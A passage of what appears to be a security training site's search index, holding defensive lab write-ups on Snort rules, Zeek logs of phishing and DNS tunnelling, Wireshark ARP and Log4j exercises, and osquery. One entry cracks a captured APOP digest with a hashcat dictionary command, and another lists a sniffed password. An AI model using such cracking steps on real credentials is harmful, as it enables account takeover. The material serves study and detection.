TCP TTL:47 TOS:0x0 ID:49312 IpLen:20 DgmLen:1420 DF ***A**** Seq: 0x114C66F0 Ack: 0x38AFFFF3 Win: 0x1920 TcpLen: 20 =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ ... Packet 64: =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ WARNING: No preprocessors configured for policy 0. 05/13-10:17:09.123830 65.208.228.223:80 -> 145.254.160.237:3372 TCP TTL:47 TOS:0x0 ID:49312 IpLen:20 DgmLen:1420 DF ***A**** Seq: 0x114C66F0 Ack: 0x38AFFFF3 Win: 0x1920 TcpLen: 20 =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ ... FTP  local.rules : # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert tcp any any <> any 21 (msg: \"FTP Packet Detected\"; sid: 100001; rev:1;) alert tcp any 21 <> any any (msg: \"FTP Packet Detected\"; sid: 100002; rev:2;) ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-3 (FTP)$ sudo snort -c local.rules -dev -l . -r ftp-png-gif.pcap ... To discover the FTP service name (get enough packets for the handshake to complete): ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-3 (FTP)$ sudo snort -r snort.log.1669576870 -d \"tcp and port 21\" -n 10 To detect failed FTP login attempts in the given pcap : # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert tcp any any <> any any (msg: \"Failed FTP Login Attempt Detected\"; content:\"530 User\" ; sid: 100001; rev:1;) To detect successful FTP logins: # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert tcp any any <> any any (msg: \"Successful FTP Login Attempt Detected\"; content:\"230 User\" ; sid: 100001; rev:1;) Each FTP login attempt with a valid username and bad password prompts a default message with the pattern; “331 Password”. Try to filter the given pattern in the FTP traffic. Try to filter the given username. To detect failed FTP login attempts with a valid username but a bad password or no password: # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert tcp any any <> any any (msg: \"Successful FTP Login Attempt Detected\"; content:\"331 Password\" ; sid: 100001; rev:1;) To detect failed FTP login attempts with “Administrator” username but a bad password or no password: # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert tcp any any <> any any (msg: \"Successful FTP Login Attempt Detected\"; content:\"331 Password\"; content:\"Administrator\"; sid: 100001; rev:1;) Images  PNG  Use the Hex Signature 89 50 4E 47 0D 0A 1A 0A to detect PNG: # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert tcp any any <> any any (msg: \"PNG File Found\"; content:\"|89 50 4E 47 0D 0A 1A 0A|\"; sid: 100001; rev:1;) 1 packet detected. To identify the software name embedded in the packet: ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-4 (PNG)$ sudo snort -d -r snort.log.1669584904 Running in packet dump mode --== Initializing Snort ==-- Initializing Output Plugins! pcap DAQ configured to read-file. Acquiring network traffic from \"snort.log.1669584904\". --== Initialization Complete ==-- ,,_ -*> Snort! <*- o\" )~ Version 2.9.7.0 GRE (Build 149) '''' By Martin Roesch & The Snort Team: http://www.snort.org/contact#team Copyright (C) 2014 Cisco and/or its affiliates. All rights reserved. Copyright (C) 1998-2013 Sourcefire, Inc., et al. Using libpcap version 1.9.1 (with TPACKET_V3) Using PCRE version: 8.39 2016-06-14 Using ZLIB version: 1.2.11 Commencing packet processing (pid=2328) WARNING: No preprocessors configured for policy 0. 01/05-20:15:59.817928 176.255.203.40:80 -> 192.168.47.171:2732 TCP TTL:128 TOS:0x0 ID:63105 IpLen:20 DgmLen:1174 ***AP*** Seq: 0x3D2348B0 Ack: 0x8C8DF67F Win: 0xFAF0 TcpLen: 20 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52 .PNG........IHDR 00 00 01 E0 00 00 01 E0 08 06 00 00 00 7D D4 BE .............}.. 95 00 00 00 19 74 45 58 74 53 6F 66 74 77 61 72 .....tEXtSoftwar 65 00 41 64 6F 62 65 20 49 6D 61 67 65 52 65 61 e.Adobe ImageRea 64 79 71 C9 65 3C 00 00 16 2E 49 44 41 54 78 DA dyq.e<....IDATx. ... GIF  Use the GIF87a and/or GIF89a to detect PNG: # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert tcp any any <> any any (msg: \"GIF87a File Found\"; content:\"GIF87a\"; sid: 100001; rev:1;) 4 packets found. To identify the...",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "b02b2cb8f80862454f1db9cb059bac5f",
    "u": "https://nta.tymyrddin.dev/docs/root-me/pop-apop",
    "t": "POP-APOP ",
    "c": "POP-APOP  root-me challenge POP-APOP : Find the user password in this network frame. wget the zip from root-me Extract the zip Dump the .pcapng in Wireshark Follow -> TCP Stream +OK Hello little hackers. <1755.1.5f403625.BcWGgpKzUPRC8vscWn0wuA==@vps-7e2f5a72> APOP bsmith 4ddd4137b84ff2db7291b568289717f0 +OK Logged in. LIST +OK 2 messages: 1 6 2 76 . RETR 1 +OK 6 octets lutz . quit +OK Logging out. APOP uses a digest parameter, calculated by applying MD5 hashing to a string containing a timestamp with angle brackets followed by a secret key. The result of the digest is a 16 octet value sent in hexadecimal, using lowercase ASCII characters. hash.txt : 4ddd4137b84ff2db7291b568289717f0:<1755.1.5f403625.BcWGgpKzUPRC8vscWn0wuA==@vps-7e2f5a72> hashcat command: hashcat -a 0 -m 10 hash.txt /usr/share/wordlists/rockyou.txt Resources  rfc1939",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "7cdb9ca69c73eec11d04d5d9aa1bdbcc",
    "u": "https://nta.tymyrddin.dev/docs/zeek/phishing",
    "t": "Phishing ",
    "c": "Phishing  An alert triggered: Phishing Attempt . The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive. Questions  Investigate the logs. zeek -Cr phishing.pcap hash-demo.zeek Investigate the http.log file. What is the suspicious source address? Which domain address were the malicious files downloaded from? ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/phishing$ cat http.log #separator \\x09 #set_separator , #empty_field (empty) #unset_field - #path http #open 2022-11-29-02-56-39 #fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p trans_depth method host uri referrer version user_agent origin request_body_len response_body_len status_code status_msg info_code info_msg tags username passwordproxied orig_fuids orig_filenames orig_mime_types resp_fuids resp_filenames resp_mime_types #types time string addr port addr port count string string string string string string string count count count string count string set[enum] string string set[string] vector[string] vector[string] vector[string] vector[string] vector[string] vector[string] 1561667874.713411 CdfiWK1W5IpFJonQo7 10.6.27.102 49157 23.63.254.163 80 1 GET www.msftncsi.com /ncsi.txt - 1.1 Microsoft NCSI - 0 14 200 OK - - (empty) - - - - - - Fpgan59p6uvNzLFja -text/plain 1561667889.643717 CqVUHAd2v5ksfZO5 10.6.27.102 49159 107.180.50.162 80 1 GET smart-fax.com /Documents/Invoice&MSO-Request.doc - 1.1 Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko - 0 323072 200 OK - - (empty)-- - - - - FB5o2Hcauv7vpQ8y3 - application/msword 1561667898.911759 CpgTPr4QCCxl5g5Rl6 10.6.27.102 49162 107.180.50.162 80 1 GET smart-fax.com /knr.exe - 1.1 Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E) - 0 2437120 200 OK - - (empty) - - - - - - FOghls3WpIjKpvXaEl -application/x-dosexec #close 2022-11-29-02-56-39 Investigate the malicious document in VirusTotal. What kind of file is associated with the malicious document? ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/phishing$ cat files.log | zeek-cut md5 cd5a4d3fdd5bffc16bf959ef75cf37bc b5243ec1df7d1d5304189e7db2744128 cc28e40b46237ab6d5282199ef78c464 VBA Investigate the extracted malicious .exe file. What is the given file name in Virustotal? PleaseWaitWindow.exe Investigate the malicious .exe file in VirusTotal. What is the contacted domain name? hopto[.]org Investigate the http.log file. What is the request name of the downloaded malicious .exe file? ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/phishing$ cat http.log ... #fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p trans_depth method host uri referrer version user_agent origin request_body_len response_body_len status_code status_msg info_code info_msg tags username passwordproxied orig_fuids orig_filenames orig_mime_types resp_fuids resp_filenames resp_mime_types ... 1561667898.911759 CUaS7e4eL8o256JIVb 10.6.27.102 49162 107.180.50.162 80 1 GET smart-fax.com /knr.exe - 1.1 Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E) - 0 2437120 200 OK - - (empty) - - - - - - FOghls3WpIjKpvXaEl -application/x-dosexec #close 2022-11-29-03-09-38",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "491debbc07701bbfe20c9bdef193b99c",
    "u": "https://nta.tymyrddin.dev/docs/zeek/dns",
    "t": "Anomalous DNS ",
    "c": "Anomalous DNS  An alert triggered: Anomalous DNS Activity . The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive. Questions  Investigate the dns-tunneling.pcap file. zeek -Cr dns-tunneling.pcap Investigate the dns.log file. ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/anomalous-dns$ head dns.log #separator \\x09 #set_separator , #empty_field (empty) #unset_field - #path dns #open 2022-11-29-02-25-45 #fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto trans_id rtt query qclass qclass_name qtype qtype_name rcode rcode_name AA TC RD RA Z answers TTLs rejected #types time string addr port addr port enum count intervalstring count string count string count string bool bool bool bool count vector[string] vector[interval] bool 1623212924.825154 CrFIrVDZv1s1wIMvg 10.20.57.3 59580 10.10.2.22 53 udp 5374 0.855652 e7f1018ea0310f25bba0610936fd1cc2af.cisco-update.com 1 C_INTERNET 15 MX 0 NOERRORFF T T 0 3591018ea0f08b48069ca0ffff640c1cfb.cisco-update.com 58.000000 F 1623212925.678141 Cgwae92G7gBAmh0KWh 10.20.57.3 47888 10.10.2.22 53 udp 7434 0.158643 0cfe016cb105e87901f6020958d084ff84.cisco-update.com 1 C_INTERNET 15 MX 0 NOERRORFF T T 0 22e1016cb1f9131fda4f34ffff52a924b3.cisco-update.com 58.000000 F What is the number of DNS records linked to the IPv6 address? ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/anomalous-dns$ cat dns.log | zeek-cut qtype_name | grep -i AAAA | wc -l 320 Investigate the conn.log file. ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/anomalous-dns$ head conn.log #separator \\x09 #set_separator , #empty_field (empty) #unset_field - #path conn #open 2022-11-29-02-25-45 #fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto service duration orig_bytes resp_bytes conn_state local_orig local_resp missed_bytes history orig_pkts orig_ip_bytes resp_pkts resp_ip_bytes tunnel_parents #types time string addr port addr port enum string intervalcount count string bool bool count string count count count count set[string] 1623212924.825154 CrFIrVDZv1s1wIMvg 10.20.57.3 59580 10.10.2.22 53 udp dns 0.855652 80 175 SF - -0 Dd 1 108 1 203 - 1623212925.678141 Cgwae92G7gBAmh0KWh 10.20.57.3 47888 10.10.2.22 53 udp dns 0.158643 80 175 SF - -0 Dd 1 108 1 203 - What is the longest connection duration? ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/anomalous-dns$ cat conn.log | zeek-cut duration | sort -n | uniq ... 9.420791 Investigate the dns.log file. Filter all unique DNS queries. What is the number of unique domain queries? You need to use the DNS query values for summarising and counting the number of unique domains. There are lots of ***.cisco-update.com DNS queries, you need to filter the main address and find out the rest of the queries that don’t contain the ***.cisco-update.com pattern. You can filter the main ***.cisco-update.com DNS pattern as cisco-update.com with cat dns.log | zeek-cut query | rev | cut -d '.' -f 1-2 | rev | head ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/anomalous-dns$ cat dns.log | zeek-cut query | rev | cut -d '.' -f 1-2 | rev | sort | uniq _tcp.local cisco-update.com in-addr.arpa ip6.arpa rhodes.edu ubuntu.com ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/anomalous-dns$ cat dns.log | zeek-cut query | rev | cut -d '.' -f 1-2 | rev | sort | uniq | wc -l 6 There are a massive amount of DNS queries sent to the same domain. This is abnormal. Let’s find out which hosts are involved in this activity. What is the IP address of the source host? ubuntu@ip-10-10-177-209:~/Desktop/Exercise-Files/anomalous-dns$ cat dns.log | zeek-cut id.orig_h | sort | uniq 10.20.57.3 fe80::202a:f0b1:7d9c:bd9e",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "589c156dd0019686aa22542518df3166",
    "u": "https://nta.tymyrddin.dev/docs/wireshark/hosts",
    "t": "Identifying hosts ",
    "c": "Identifying hosts  When investigating a compromise or malware infection activity, a security analyst should know how to identify the hosts on the network apart from IP to MAC address match. One of the best methods is identifying the hosts and users on the network to decide the investigation’s starting point and list the hosts and users associated with the malicious traffic/activity. Usually, enterprise networks use a predefined pattern to name users and hosts. While this makes knowing and following the inventory easier, it has good and bad sides. The good side is that it will be easy to identify a user or host by looking at the name. The bad side is that it will be easy to clone that pattern and live in the enterprise network for adversaries. There are multiple solutions to avoid these kinds of activities, but for a security analyst, it is still essential to have host and user identification skills. Protocols that can be used in Host and User identification: Dynamic Host Configuration Protocol (DHCP) traffic, for managing automatic IP address and required communication parameters assignment. NetBIOS (NBNS) traffic, for allowing applications on different hosts to communicate with each other. Kerberos traffic, for authenticating service requests between two or more computers over the untrusted network. The ultimate aim is to prove identity securely. Questions  Use the Desktop/exercise-pcaps/dhcp-netbios-kerberos/dhcp-netbios.pcap file. What is the MAC address of the host Galaxy A30 ? 9a:81:41:cb:96:6c How many NetBIOS registration requests does the LIVALJM workstation have? 16 Which host requested the IP address 172.16.13.85 ? Galaxy-A12 Use the Desktop/exercise-pcaps/dhcp-netbios-kerberos/kerberos.pcap file. What is the IP address of the user u5 ? (Enter the address in defanged format.) 10[.]1[.]12[.]2 What is the hostname of the available host in the Kerberos packets? xp1$ .",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "f31f9abc88532339d8dcb05cb7f1db1d",
    "u": "https://nta.tymyrddin.dev/docs/zeek/frameworks",
    "t": "Frameworks ",
    "c": "Frameworks  Zeek has 15+ frameworks that help analysts to discover the different events of interest. Questions  Ensure you are in the right directory to find the pcap file and accompanying files: Desktop/Exercise-Files/TASK-8 Investigate the case1.pcap file with intelligence-demo.zeek script. zeek -C -r case1.pcap intelligence-demo.zeek Investigate the intel.log file. Look at the second finding, where was the intel info found? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-8$ cat intel.log #separator \\x09 #set_separator , #empty_field (empty) #unset_field - #path intel #open 2022-11-29-01-10-33 #fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p seen.indicator seen.indicator_type seen.where seen.node matched sources fuid file_mime_type file_desc #types time string addr port addr port string enum enum string set[enum] set[string] string string string 1561667898.779213 CB7PV32LkE7FysWa7k 10.6.27.102 53770 10.6.27.1 53 smart-fax.com Intel::DOMAIN DNS::IN_REQUEST zeek Intel::DOMAIN TASK-8-Demo - - - 1561667898.911759 CVNbG83FLsjLKgtbhi 10.6.27.102 49162 107.180.50.162 80 smart-fax.com Intel::DOMAIN HTTP::IN_HOST_HEADER zeek Intel::DOMAIN TASK-8-Demo - - - #close 2022-11-29-01-10-33 Investigate the http.log file. What is the name of the downloaded .exe file? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-8$ cat http.log | zeek-cut uri /ncsi.txt /Documents/Invoice&MSO-Request.doc /knr.exe Investigate the case1.pcap file with hash-demo.zeek script. Investigate the files.log file. zeek -C -r case1.pcap hash-demo.zeek What is the MD5 hash of the downloaded .exe file? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-8$ cat files.log | zeek-cut md5 cd5a4d3fdd5bffc16bf959ef75cf37bc b5243ec1df7d1d5304189e7db2744128 cc28e40b46237ab6d5282199ef78c464 <= Investigate the case1.pcap file with file-extract-demo.zeek script. zeek -C -r case1.pcap /opt/zeek/share/zeek/policy/frameworks/files/extract-all-files.zeek Investigate the extract_files folder. Review the contents of the text file. What is written in the file? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-8/extract_files$ file * | nl 1 extract-1561667874.743959-HTTP-Fpgan59p6uvNzLFja: ASCII text, with no line terminators 2 extract-1561667889.703239-HTTP-FB5o2Hcauv7vpQ8y3: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.3, Code page: 1252, Template: Normal.dotm, Last Saved By: Administrator, Revision Number: 2, Name of Creating Application: Microsoft Office Word, Create Time/Date: Thu Jun 27 18:24:00 2019, Last Saved Time/Date: Thu Jun 27 18:24:00 2019, Number of Pages: 1, Number of Words: 0, Number of Characters: 1, Security: 0 3 extract-1561667899.060086-HTTP-FOghls3WpIjKpvXaEl: PE32 executable (GUI) Intel 80386, for MS Windows ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-8/extract_files$ cat extract-1561667874.743959-HTTP-Fpgan59p6uvNzLFja Microsoft NCSI Resources  Zeek: Frameworks",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "33a4b9801919f58274b2d0aaea19446d",
    "u": "https://nta.tymyrddin.dev/docs/zeek/scripts",
    "t": "Scripts ",
    "c": "Scripts  Zeek has its own event-driven scripting language, which is as powerful as high-level languages and allows us to investigate and correlate the detected events. Scripts can also be used to apply a policy. What Where Zeek has base scripts installed by default, and these are not intended to be modified. These scripts are located in /opt/zeek/share/zeek/base . User-generated or modified scripts should be located in a specific path. These scripts are located in /opt/zeek/share/zeek/site . Policy scripts are located in a specific path. These scripts are located in /opt/zeek/share/zeek/policy . To automatically load/use a script in live sniffing mode, identify the script in the Zeek configuration file. You can also use a script for a single run. The configuration file is located in /opt/zeek/share/zeek/site/local.zeek . Zeek scripts use the .zeek extension. Do not modify anything under the zeek/base directory. User-generated and modified scripts should be in the zeek/site directory. You can call scripts in live monitoring mode by loading them with the command load @/script/path or load @script-name in local.zeek file. Zeek is event-oriented, not packet-oriented! Use/write scripts to handle the event of interest. GUI vs scripts  Sample script: event dhcp_message (c: connection, is_orig: bool, msg: DHCP::Msg, options: DHCP::Options) { print options$host_name; } Use: ubuntu@ubuntu$ zeek -C -r smallFlows.pcap dhcp-hostname.zeek student01-PC vinlap01 Customized script locations  /opt/zeek/share/zeek/base/bif /opt/zeek/share/zeek/base/bif/plugins /opt/zeek/share/zeek/base/protocols Questions  Ensure you are in the right directory to find the pcap file and accompanying files: Desktop/Exercise-Files/TASK-6 Investigate the smallFlows.pcap file. Investigate the dhcp.log file. zeek -C -r smallFlows.pcap dhcp-hostname.zeek What is the domain value of the vinlap01 host? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-6/smallflow$ cat dhcp.log #separator \\x09 #set_separator , #empty_field (empty) #unset_field - #path dhcp #open 2022-11-29-00-36-54 #fields ts uids client_addr server_addr mac host_name client_fqdn domain requested_addr assigned_addr lease_time client_message server_message msg_types duration #types time set[string] addr addr string string string string addr addr interval string string vector[string] interval 1295981573.013593 CCeH6O2TYiCIiNUQV9 192.168.3.131 - 40:61:86:9a:f1:f5 student01-PC - - - - - - -INFORM 0.000000 1295981640.291009 CIwdwt1EsLJNcVGLEe,CJeD8z4JyIrDrPEeB5 172.16.255.1 -00:1e:68:51:4f:a9 vinlap01 - astaro_vineyard - - -- - INFORM,ACK 0.000591 #close 2022-11-29-00-36-56 Investigate the bigFlows.pcap file. zeek -C -r bigFlows.pcap dhcp-hostname.zeek Investigate the dhcp.log file. What is the number of identified unique hostnames? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-6/bigflow$ cat dhcp.log | zeek-cut host_name | sort -rn | uniq | wc -l 18 <= -1 Investigate the dhcp.log file. What is the identified domain value? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-6/bigflow$ cat dhcp.log | zeek-cut domain jaalam.net Investigate the dns.log file. What is the number of unique queries? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-6/bigflow$ cat dns.log | zeek-cut query | grep -v -e '*' -e '-' | sort -rn | uniq | wc -l 1109 Resources  Zeek’s official training platform",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "98010da5dcc51d5113df6b4d4b6c3f44",
    "u": "https://nta.tymyrddin.dev/docs/wireshark/on-path",
    "t": "ARP poisoning & on-path ",
    "c": "ARP poisoning & on-path  ARP protocol, or Address Resolution Protocol (ARP), is the technology responsible for allowing devices to identify themselves on a network. Address Resolution Protocol Poisoning (also known as ARP Spoofing or Man In The Middle (MITM) attack) is a type of attack that involves network jamming/manipulating by sending malicious ARP packets to the default gateway. The ultimate aim is to manipulate the “IP to MAC address table” and sniff the traffic of the target host. There are a variety of tools available to conduct ARP attacks. However, the mindset of the attack is static, so it is easy to detect such an attack by knowing the ARP protocol workflow and Wireshark skills. ARP analysis in a nutshell: Works on the local network Enables the communication between MAC addresses Not a secure protocol Not a routable protocol It doesn’t have an authentication function Common patterns are request & response, announcement and gratuitous packets. Questions  Use the Desktop/exercise-pcaps/arp/Exercise.pcapng file. What is the number of ARP requests crafted by the attacker? 284 What is the number of HTTP packets received by the attacker? 90 What is the number of sniffed username&password entries? 6 What is the password of the Client986 ? clientnothere! What is the comment provided by the Client354 ? Nice work! .",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "d958becabccad7c5519754c3750dc02d",
    "u": "https://nta.tymyrddin.dev/docs/root-me/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Root-me Network challenges Why?  Investigate captured traffic, network services, and perform packet analysis. How?  FTP authentication TELNET authentication ETHERNET frame Twitter authentication Bluetooth Unknown file CISCO password DNS zone transfer IP Time To Live LDAP null bind POP-APOP SIP authentication ETHERNET patched transmission Global system traffic for mobile communication SSL HTTP exchange",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "957d50c3d9b051a17a73560c9e599c80",
    "u": "https://nta.tymyrddin.dev/docs/wireshark/rules",
    "t": "Firewall rules ",
    "c": "Firewall rules  Wireshark is mostly, but not only about packet details; it facilitates the creation of firewall rules with the “Tools -> Firewall ACL Rules” menu. This will open a new window and provide a combination of rules (IP, port and MAC address-based) for different purposes. These rules are generated for implementation on an outside firewall interface. Currently, Wireshark can create rules for: Netfilter (iptables) Cisco IOS (standard/extended) IP Filter (ipfilter) IPFirewall (ipfw) Packet filter (pf) Windows Firewall (netsh new/old format) Questions  Use the Desktop/exercise-pcaps/bonus/Bonus-exercise.pcap file. Select packet number 99 . Create a rule for IPFirewall ( ipfw ). What is the rule for denying source IPv4 address ? add deny ip from 10.121.70.151 to any in Select packet number 231 . Create IPFirewall rules. What is the rule for allowing destination MAC address ? add allow MAC 00:d0:59:aa:af:80 any in",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "0729d451b0245ace90dd7b538d2fc73a",
    "u": "https://nta.tymyrddin.dev/docs/root-me/global-mobile",
    "t": "Global system traffic for mobile communication ",
    "c": "Global system traffic for mobile communication  root-me challenge Global System Traffic for Mobile communication : You have been asked to check the network traffic file enclosed. Report your findings to your caller, even if it seems the trace was truncated. Get data without length information of package with size 126 bytes on wire from the capture: 0791233010210068040b917120336603f800002140206165028047c7f79b0c52bfc52c101d5d0699d9e133283d0785e764f87b6da7956bb7f82d2c8b Use an online SMS PDU Decoder. Resources  rfc5724",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "51978cecfd13891857d44ac622fd9433",
    "u": "https://nta.tymyrddin.dev/docs/wireshark/clear-text",
    "t": "Clear-text protocol analysis ",
    "c": "Clear-text protocol analysis  Investigating clear-text protocol traces sounds easy, but when the time comes to investigate a big network trace for incident analysis and response, the game changes. Proper analysis is more than following the stream and reading the cleartext data. For a security analyst, it is important to create statistics and key results from the investigation process. FTP analysis  File Transfer Protocol (FTP) is designed to transfer files with ease, so it focuses on simplicity rather than security. As a result of this, using this protocol in unsecured environments could create security issues like: On-path attacks Credential stealing and unauthorised access Phishing Malware planting Data exfiltration HTTP Analysis  Hypertext Transfer Protocol (HTTP) is a clear-text-based, request-response and client-server protocol. It is the standard type of network activity to request/serve web pages, and by default, it is not blocked by any network perimeter. As a result of being unencrypted and the backbone of web traffic, HTTP is one of the must-to-know protocols in traffic analysis. Following attacks could be detected with the help of HTTP analysis: Phishing pages Web attacks Data exfiltration Command and control traffic (C2) User-Agent analysis  As the adversaries use sophisticated technics to accomplish attacks, they try to leave traces similar to natural traffic through the known and trusted protocols. For a security analyst, it is important to spot the anomaly signs on the bits and pieces of the packets. The user-agent field is one of the great resources for spotting anomalies in HTTP traffic. In some cases, adversaries successfully modify the user-agent data, which could look supernatural. A security analyst cannot rely only on the user-agent field to spot an anomaly. Never whitelist a user-agent , even if it looks natural. User-agent-based anomaly/threat detection/hunting is an additional data source to check and is useful when there is an obvious anomaly. Questions  Use the Desktop/exercise-pcaps/ftp/ftp.pcap file. How many incorrect login attempts are there? 737 What is the size of the file accessed by the ftp account? 39424 The adversary uploaded a document to the FTP server. What is the filename? resume.doc The adversary tried to assign special flags to change the executing permissions of the uploaded file. What is the command used by the adversary? chmod 777 Use the Desktop/exercise-pcaps/http/user-agent.cap file. Investigate the user agents. What is the number of anomalous user-agent types? 6 What is the packet number with a subtle spelling difference in the user agent field? 52 Use the Desktop/exercise-pcaps/http/http.pcapng file. Locate the Log4j attack starting phase. What is the packet number? 444 Locate the Log4j attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (Enter the address in defanged format and exclude {} .) Copy value. 62[.]210[.]130[.]250 .",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "0ca4d6051c6e8620140923c0fb7f33a5",
    "u": "https://edr.tymyrddin.dev/",
    "t": "Endpoint detection and response (EDR) ",
    "c": "Endpoint detection and response (EDR)  Endpoint Detection and Response (EDR) is no longer optional. It is a core pillar of cybersecurity and regulations mandate EDR. Vulnerability scanners @GitHub Windows vulnerability scanner MacOS vulnerability scanner Linux vulnerability scanner Android vulnerability scanner iOS vulnerability scanner Tools @Testlab Endpoint Detection and Response tools Threat hunting tools macOS EDR techniques Introduction Process monitoring Memory protection Behavioural detection Network hardening Linux EDR techniques Introduction Kernel-level monitoring Filesystem integrity Container security Threat Hunting with Open Source Windows EDR techniques Introduction Process & behaviour monitoring Memory protection Attack Surface Reduction (ASR) Network threat detection Persistence and logging Response techniques EDR shell scripts @GitHub Windows EDR powershell script MacOS EDR shell script Linux EDR shell script TryHackMe Room  Windows core Introduction smss.exe csrss.exe wininit.exe services.exe svchost.exe lsass.exe winlogon.exe explorer.exe Windows sysinternals Introduction File and disk utilities Networking utilities Process utilities Security utilities System information Miscellaneous Windows event logs Introduction Event logs XPath queries Scenarios Sysmon Introduction Event IDs Cutting out the noise Hunting metasploit Detecting mimikatz Hunting malware Hunting persistence Detecting evasion techniques Practical investigations Osquery basics Introduction Osquery shell Schema documentation Creating queries",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "abda95611e0b9cf8dd026df9fdbb5ef2",
    "u": "https://edr.tymyrddin.dev/docs/osquery/shell",
    "t": "Osquery shell ",
    "c": "Osquery shell  One of the ways to interact with Osquery is by using the interactive mode: $ osqueryi To list all the available tables that can be queried: osquery> .table => appcompat_shims => arp_cache => atom_packages => authenticode => autoexec => azure_instance_metadata => azure_instance_tags => background_activities_moderator => bitlocker_info => carbon_black_info => carves => certificates => chassis_info => chocolatey_packages To list all the tables with the term user in them: osquery> .table user => user_groups => user_ssh_keys => userassist => users Schemas  To list the user’s table schema: osquery> .schema users CREATE TABLE users(`uid` BIGINT, `gid` BIGINT, `uid_signed` BIGINT, `gid_signed` BIGINT, `username` TEXT, `description` TEXT, `directory` TEXT, `shell` TEXT, `uuid` TEXT, `type` TEXT, `is_hidden` INTEGER HIDDEN, `pid_with_namespace` INTEGER HIDDEN, PRIMARY KEY (`uid`, `username`, `uuid`, `pid_with_namespace`)) WITHOUT ROWID; To display the columns from the user table: osquery>select gid, uid, description, username, directory from users; +-----+------+------------------------------------------------------------+----------------------+-------------------------------------------+ | gid | uid | description | username | directory | +-----+------+-------------------------------------------------------------------------------------------------------------------------------+ | 544 | 500 | Built-in account for administering the computer/domain | Administrator | | | 581 | 503 | A user account managed by the system. | DefaultAccount | | | 546 | 501 | Built-in account for guest access to the computer/domain | Guest | | | 544 | 1002 | | James | C:\\Users\\James | | 18 | 18 | | SYSTEM | %systemroot%\\system32\\config\\systemprofile | | 19 | 19 | | LOCAL SERVICE | %systemroot%\\ServiceProfiles\\LocalService | | 20 | 20 | | NETWORK SERVICE | %systemroot%\\ServiceProfiles\\NetworkService | +-----+------+------------------------------------------------------------+--------------------+---------------------------------------------+ Display Mode  .mode MODE Set output mode where MODE is one of: csv Comma-separated values column Left-aligned columns see .width line One value per line list Values delimited by .separator string pretty Pretty printed SQL results (default) Resources  osquery readthedocs",
    "cat": "blue_soc",
    "type": "html"
  },
  {
